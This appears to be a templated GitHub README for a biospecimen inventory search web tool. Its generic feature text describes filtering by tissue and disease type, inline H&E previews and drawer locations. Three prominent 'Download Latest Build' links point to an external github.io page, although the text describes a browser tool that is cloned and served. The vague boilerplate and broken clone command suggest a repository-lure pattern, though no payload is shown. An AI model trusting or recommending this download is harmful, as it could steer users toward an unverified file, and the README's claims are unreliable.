# Aliquot Biospecimen Search Tool v2026 - Web Tool 2026

> **Find biospecimens in the browser with Aliquot inventory search, tissue and disease filtering, inline H&E previews, and a web-first workflow centered on the 2026 release.**

[![Platform](https://img.shields.io/badge/Platform-web-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-v2026-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/zack-carterguyr9569/aliquot-biospecimen-search-2026?style=flat-square)](https://github.com/zack-carterguyr9569/aliquot-biospecimen-search-2026)

---

<p align="center">
  <a href="https://zack-carterguyr9569.github.io/aliquot-biospecimen-search-2026/">
    <img src="https://img.shields.io/badge/Download-Aliquot%20Biospecimen%20Search%20Tool%20Latest-brightgreen?style=for-the-badge" alt="Download Aliquot Biospecimen Search Tool">
  </a>
</p>

> **[Download Latest Build](https://zack-carterguyr9569.github.io/aliquot-biospecimen-search-2026/)**

---

[Download Latest Build](https://zack-carterguyr9569.github.io/aliquot-biospecimen-search-2026/)

---

## Overview

Aliquot Biospecimen Search Tool is a browser-based utility that queries Aliquot search and inventory endpoints to help users locate biospecimens quickly. It supports narrowing results by name, tissue type, disease type, and specimen type, while keeping inventory availability in view during the search.

The tool is meant for fast record review when you want specimen details without jumping between separate applications. It can show inactive entries, restrict results to items currently in inventory, and present drawer and column positions alongside inline H&E image previews when those assets are available.

---

## What it does

- Search biospecimens by name, tissue type, disease type, and specimen type
- Filter out inactive specimens during review
- Limit results to specimens currently present in inventory
- View drawer and column locations for matched items
- See H&E images inline with each result when available
- Use Aliquot API endpoints for search and inventory access
- Work through a web interface built for quick lookup sessions
- Support inventory-focused browsing with cloudflare access in the workflow

---

## Installation

Because this is a web tool, setup usually means hosting it or opening it in a browser environment.

1. Clone or download the repository:
   - `git clone https://github.com/zack-carterguyr9569/aliquot-biospecimen-search-2026.git
2. Open the project folder.
3. Serve or launch the HTML entry point in your preferred web host or local static server.
4. Visit the site in a browser and connect it to the Aliquot endpoints required by your setup.

If you are testing locally, use any static server you already have available and open the main HTML file through that server rather than loading it directly from disk.

---

## How to use it

Typical workflow:

1. Open the web app in your browser.
2. Enter a biospecimen name or narrow the search by tissue or disease type.
3. Apply inventory-related filters to focus on available specimens.
4. Review matching entries, including location details and any inline H&E images.
5. Use the results to identify the records that fit your search criteria.

Example search flow:

- Search by disease type to find matching specimens
- Add a tissue type filter to narrow the results
- Review inventory status and skip inactive records if needed
- Inspect drawer and column placement for the final selection

---

## Configuration

What you configure depends on the hosting setup and how your Aliquot environment is exposed.

Common settings usually include:
- API endpoint base URL
- Inventory query settings
- Search filters and result limits
- Access-related values for environments that require Cloudflare handling

If your deployment uses a config file or inline variables, keep those values in the project's main settings area or the hosting environment used for the web app.

---

## Requirements

- A modern web browser
- Access to the Aliquot search and inventory endpoints used by the tool
- HTML-capable hosting or a local static server for testing
- Network access to any required Cloudflare-protected resources in your environment

---

## FAQ

**How do I update the tool?**  
Pull the latest changes from the repository or replace your hosted build with the newest version available from the project link.

**Why are no results showing?**  
Check the search terms, inventory filters, and endpoint configuration. Also confirm that the data source is reachable from your browser session.

**Where are settings stored?**  
That depends on your deployment. In many setups, values are kept in the web app's configuration area or in the hosting environment.

**What should I check if images do not load?**  
Verify the Aliquot data source, image availability, and any access restrictions that may affect the browser session.

**Can this run locally?**  
Yes, if you serve the HTML project through a local or static web server and your endpoint configuration is reachable from that environment.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
